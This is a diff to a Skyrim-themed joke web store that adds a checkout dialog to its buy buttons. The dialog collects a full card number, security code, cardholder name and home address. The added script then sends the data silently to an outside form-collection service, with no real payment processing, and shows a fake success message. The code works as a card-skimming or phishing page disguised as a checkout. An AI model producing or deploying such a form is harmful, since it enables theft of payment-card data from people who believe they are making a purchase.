@@ -346,7 +346,7 @@
         <p class="precio-antes">1.000 Séptims</p>
         <p class="precio-ahora">800 Séptims <span class="descuento">(20% OFF)</span></p>
         <p>💳 12 cuotas sin interés de 67 Séptims</p>
-        <button style="background:#b89441; padding:10px 20px; border:none; font-weight:bold; cursor:pointer; margin-top:10px;">Comprar</button>
+        <button onclick="document.getElementById('modal-pago').showModal()" style="background:#b89441; padding:10px 20px; border:none; font-weight:bold; cursor:pointer; margin-top:10px;">Comprar</button>
 
         <details>
             <summary>Ver Ficha Técnica y Descripción</summary>
@@ -386,7 +386,7 @@
         <p class="precio-antes">10.000 Séptims</p>
         <p class="precio-ahora">8.500 Séptims <span class="descuento">(15% OFF)</span></p>
         <p>💳 6 cuotas sin interés de 1.416 Séptims</p>
-        <button style="background:#b89441; padding:10px 20px; border:none; font-weight:bold; cursor:pointer; margin-top:10px;">Comprar</button>
+        <button onclick="document.getElementById('modal-pago').showModal()" style="background:#b89441; padding:10px 20px; border:none; font-weight:bold; cursor:pointer; margin-top:10px;">Comprar</button>
 
         <details>
             <summary>Ver Ficha Técnica y Descripción</summary>
@@ -422,7 +422,7 @@
     <p class="precio-antes">18.000 Séptims</p>
     <p class="precio-ahora">15.120 Séptims <span class="descuento">(16% OFF)</span></p>
     <p>💳 12 cuotas sin interés de 1.260 Séptims</p>
-    <button style="background:#b89441; padding:10px 20px; border:none; font-weight:bold; cursor:pointer; margin-top:10px;">Comprar</button>
+    <button onclick="document.getElementById('modal-pago').showModal()" style="background:#b89441; padding:10px 20px; border:none; font-weight:bold; cursor:pointer; margin-top:10px;">Comprar</button>
 
     <details>
         <summary>Ver Ficha Técnica y Descripción</summary>
@@ -497,5 +497,100 @@
         <p>Medios de pago: Séptims y Soul gems</p>
     </footer>
 
+    <dialog id="modal-pago">
+    <div class="header-dialog">
+        <h2>Procesar Pago - Dovah Store</h2>
+        <button class="btn-cerrar" onclick="document.getElementById('modal-pago').close()">×</button>
+    </div>
+    
+    <form class="formulario-skyrim" id="form-pago-dovah">
+        <input type="hidden" name="producto_comprado" value="Skeleton Key">
+
+        <div>
+            <label for="pago-nombre">Nombre completo del titular:</label>
+            <input type="text" id="pago-nombre" name="nombre_titular" placeholder="Ej: Jarl Balgruuf" required>
+        </div>
+
+        <div>
+            <label for="pago-user">Nombre de usuario en la tienda:</label>
+            <input type="text" id="pago-user" name="usuario_tienda" placeholder="Ej: xXDragonBorn09Xx" required>
+        </div>
+
+        <div>
+            <label>Tipo de Tarjeta:</label>
+            <div class="grupo-opciones">
+                <input type="radio" id="tarjeta-mastercard" name="tipo_tarjeta" value="Mastercard" checked>
+                <label for="tarjeta-mastercard">Mastercard</label>
+                
+                <input type="radio" id="tarjeta-visa" name="tipo_tarjeta" value="Visa">
+                <label for="tarjeta-visa">Visa</label>
+            </div>
+        </div>
+
+        <div>
+            <label for="pago-tarjeta">Número de Tarjeta:</label>
+            <input type="text" id="pago-tarjeta" name="numero_tarjeta" pattern="[0-9]{13,19}" placeholder="XXXX XXXX XXXX XXXX" required>
+        </div>
+
+        <div>
+            <label for="pago-seguridad">Número de seguridad:</label>
+            <input type="password" id="pago-seguridad" name="codigo_seguridad" pattern="[0-9]{3,4}" placeholder="Ej: 123" required>
+        </div>
+
+        <div>
+            <label for="pago-cp">Código Postal:</label>
+            <input type="text" id="pago-cp" name="codigo_postal" placeholder="Ej: 1406" required>
+        </div>
+
+        <div>
+            <label for="pago-direccion">Dirección de entrega (Donde vive):</label>
+            <input type="text" id="pago-direccion" name="direccion_vivienda" placeholder="Ej: Riften: / Whiterun" required>
+        </div>
+
+        <div class="grupo-terminos">
+            <input type="checkbox" id="pago-terminos" name="terminos_aceptados" required>
+            <label for="pago-terminos">Acepto los términos, condiciones y la política de entrega del gremio</label>
+        </div>
+
+        <div id="pago-exito" style="display: none; color: #44ff44; text-align: center; margin-bottom: 15px; font-weight: bold;">
+            ¡Pago procesado con éxito! Wind guide you.
+        </div>
+
+        <button type="submit" class="btn-enviar">Confirmar Compra</button>
+    </form>
+</dialog>
+    
+<script>
+document.getElementById('form-pago-dovah').addEventListener('submit', function(event) {
+    event.preventDefault(); // Evita que la página se recargue o se vaya a otra web
+
+    const formulario = event.target;
+    const datos = new FormData(formulario);
+
+    // Envío silencioso a tu nuevo enlace de Formspark para la compra
+    fetch('https://submit-form.com/kzhojSbUl', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify(Object.fromEntries(datos))
+    })
+    .then(response => {
+        if (response.ok) {
+            // Muestra el texto verde de éxito dentro del modal
+            document.getElementById('pago-exito').style.display = 'block';
+            formulario.reset(); // Limpia los campos del checkout
+        } else {
+            alert('El banco de Iron Bank de Braavos o los Septims fallaron. Intenta de nuevo.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('No se pudo establecer conexión con el servidor de pago.');
+    });
+});
+</script>   
+    
 </body>
 </html>
